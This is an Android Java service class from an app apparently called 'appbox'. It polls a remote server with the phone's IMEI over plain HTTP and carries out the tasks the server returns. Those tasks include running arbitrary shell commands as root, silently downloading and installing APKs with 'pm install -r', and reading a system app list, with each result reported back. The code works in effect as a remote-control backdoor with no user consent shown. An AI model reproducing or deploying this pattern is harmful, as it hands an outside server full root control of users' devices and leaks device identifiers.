package cn.com.hewoyi.appbox;

import android.app.AlarmManager;
import android.app.IntentService;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.lidroid.xutils.HttpUtils;
import com.lidroid.xutils.cache.MD5FileNameGenerator;
import com.lidroid.xutils.http.HttpHandler;
import com.lidroid.xutils.http.ResponseInfo;
import com.lidroid.xutils.http.callback.RequestCallBack;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.Collections;
import java.util.HashSet;
import java.util.Set;

public class TaskIntentService extends IntentService {

    class Task {
        public final static String Shell = "Shell";
        public final static String Install = "Install";
        public final static String GetAppList = "GetAppList";
    }

    public class TaskThread extends Thread {
        private JSONObject task;

        public TaskThread(JSONObject task) {
            this.task = task;
        }

        public void run() {
            doTask(task);
        }
    }

    public class UpdateTaskThread extends Thread {
        private String id;
        private int status;
        private String result;

        public UpdateTaskThread(String id, int status, String result) {
            this.id = id;
            this.status = status;
            this.result = result;
        }

        public void run() {
            updateTask(id, status, result);
        }
    }

    private Set<String> DoingTasks = Collections.synchronizedSet(new HashSet<String>());
    OkHttpClient client = new OkHttpClient();

    public TaskIntentService() {
        super("TaskIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        //读取配置文件中的rate频率
        SharedPreferences pref = getSharedPreferences("conService", MODE_PRIVATE);
        int rate = pref.getInt("rate", 5);//没有找到则传出默认值300
        //Alarm定时器
        AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
        int aTime = rate * 1000; // 默认，可以更改配置
        Intent in = new Intent(this, TaskIntentService.class);
        PendingIntent pi = PendingIntent.getService(this.getApplicationContext(), 0, in, PendingIntent.FLAG_UPDATE_CURRENT);
        manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + aTime, pi);
        Log.i("TaskService", "==============================>test");

        JSONArray ja = getTasks();
        //taskArray不为null时操作
        if (ja != null) {
            for (int i = 0; i < ja.size(); i++) {
                JSONObject task = ja.getJSONObject(i);
                String id = task.getString("_id");
                if (!DoingTasks.contains(id)) {
                    //Log.i("TaskService", "Add Task:" + id);
                    DoingTasks.add(id);
                    new TaskThread(task).start();
                }

            }
        }
    }

    public JSONArray getTasks() {
        //从服务器获取任务列表
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);


        Request request = new Request.Builder()
                .url("http://api.hewoyi.com.cn/v1/tasks?imei=" + telephonyManager.getDeviceId())
                .build();

        try {
            Response response = client.newCall(request).execute();
            String responseText = response.body().string();
            //返回文本不为空的时候操作
            if (responseText != null && (!responseText.isEmpty())) {
                JSONObject jsonObject = JSON.parseObject(responseText);
                //设定频率，会写在配置文件里
                if (jsonObject.containsKey("rate")) {
                    getSharedPreferences("conService", MODE_PRIVATE).edit().putInt("rate", jsonObject.getIntValue("rate")).apply();
                }
                //获取data则直接返回
                return jsonObject.getJSONArray("data");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        //没有获取或者报错就返回null
        return null;
    }


    public void doTask(JSONObject task) {
        int status = -1;
        String result = "";

        if (task.getString("type").equals(Task.Shell)) {
            ShellUtils.CommandResult cmdResult = ShellUtils.execCommand(task.getJSONObject("params").getString("cmd"), true, true);
            //result of command, 0 means normal, else means error
            if (cmdResult.result == 0) {
                result = cmdResult.successMsg;
                status = 1;
            } else {
                status = -1;
                result = cmdResult.errorMsg;
            }
        } else if (task.getString("type").equals(Task.Install)) {
            this.install(task);
            return;
        } else if (task.getString("type").equals(Task.GetAppList)) {
            File file = new File("/system/etc/app.list");
            if (file.exists()) {
                result = this.txt2String(file);
                status = 1;
            } else {
                status = -1;
                result = "NND 没有文件";
            }
        } else {
            result = "Type Error";
        }
        new UpdateTaskThread(task.getString("_id"), status, result).start();
        DoingTasks.remove(task.getString("_id"));

    }

    public void updateTask(String id, int status, String result) {
        //post task 更新数据到服务器
        String json = "";
        //Log.i("TaskService", "id =" + id + " status = " + status + " result =" + result);

        JSONObject js = new JSONObject();
        js.put("status", status);
        js.put("result", result);
        json = js.toString();

        RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), json);
        Request request = new Request.Builder()
                .url("http://api.hewoyi.com.cn/v1/task/" + id)
                .post(body)
                .build();
        try {
            //post操作
            Response response = client.newCall(request).execute();
            //post后返回的string
            //Log.i("TaskService", response.body().string());
        } catch (IOException e) {
            e.printStackTrace();
        }
        // if respnose success true is true or ....
    }


    public void install(final JSONObject task) {
        if (isWifi()) {
            HttpUtils http = new HttpUtils();
            final MD5FileNameGenerator md5 = new MD5FileNameGenerator();

            final String url = task.getJSONObject("params").getString("apk");

            downloadHandler = http.download(url,
                    "/sdcard/download/" + md5.generate(url) + ".apk",
                    true, // 如果目标文件存在，接着未完成的部分继续下载。服务器不支持RANGE时将从新下载。
                    true, // 如果从请求返回信息中获取到文件名，下载完成后自动重命名。
                    new RequestCallBack<File>() {
                        @Override
                        public void onStart() {

                        }

                        @Override
                        public void onLoading(long total, long current, boolean isUploading) {
                            //Log.i("TaskService", "current:" + current + "/total:" + total);
                            //并非wifi状态，注意前面的！号
                            if (!isWifi()) {
                                downloadHandler.cancel();
                            }
                        }

                        @Override
                        public void onSuccess(ResponseInfo<File> responseInfo) {
                            //Log.i("TaskService", md5.generate(url));
                            String packageName = getPackageName(getApplicationContext(), "/sdcard/download/" + md5.generate(url) + ".apk");

                            Boolean isRoot = ShellUtils.checkRootPermission();
                            if (isRoot) {
                                //有root则安装并上传result
                                ShellUtils.CommandResult cmdResult = ShellUtils.execCommand("pm install -r /sdcard/download/" + md5.generate(url) + ".apk", true, true);
                                String result;
                                result = cmdResult.successMsg + "|" + cmdResult.errorMsg;
                                if (result.contains("uccess")) {
                                    new UpdateTaskThread(task.getString("_id"), 1, result).start();
                                    DoingTasks.remove(task.getString("_id"));
                                }
                            }
                        }

                        @Override
                        public void onFailure(com.lidroid.xutils.exception.HttpException error, String msg) {

                            if (msg.equals("maybe the file has downloaded completely")) {
                                String packageName = getPackageName(getApplicationContext(), "/sdcard/download/" + md5.generate(url) + ".apk");

                                Boolean isRoot = ShellUtils.checkRootPermission();
                                if (isRoot) {
                                    //有root则安装并上传result
                                    ShellUtils.CommandResult cmdResult = ShellUtils.execCommand("pm install -r /sdcard/download/" + md5.generate(url) + ".apk", true, true);
                                    String result;
                                    result = cmdResult.successMsg + "|" + cmdResult.errorMsg;
                                    //如果result包含有success字样则成功（不写s是不知道具体机型是大写还是小写）
                                    if (result.contains("uccess")) {
                                        new UpdateTaskThread(task.getString("_id"), 1, result).start();
                                        DoingTasks.remove(task.getString("_id"));
                                    }
                                }
                            }
                        }
                    });

        }
    }

    private HttpHandler downloadHandler = null;

    public boolean isWifi() {
        NetworkInfo activeNetwork = ((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
        if (activeNetwork != null && activeNetwork.isAvailable()) {
            //判断是否为wifi
            return activeNetwork.getType() == ConnectivityManager.TYPE_WIFI;
        }
        return false;
    }

    public String txt2String(File file) {
        String result = "";
        try {
            BufferedReader br = new BufferedReader(new FileReader(file));//构造一个BufferedReader类来读取文件
            String s = null;
            while ((s = br.readLine()) != null) {//使用readLine方法，一次读一行
                result = result + "#NL#" + s;
            }
            br.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return result;
    }

    public static String getPackageName(Context context, String apkPath) {
        PackageManager pm = context.getPackageManager();
        PackageInfo info = pm.getPackageArchiveInfo(apkPath,
                PackageManager.GET_ACTIVITIES);
        if (info != null) {
            ApplicationInfo appInfo = info.applicationInfo;
            appInfo.sourceDir = apkPath;
            appInfo.publicSourceDir = apkPath;
            try {
                return appInfo.packageName;
            } catch (OutOfMemoryError e) {
                Log.e("ApkIconLoader", e.toString());
            }
        }
        return "";
    }
}
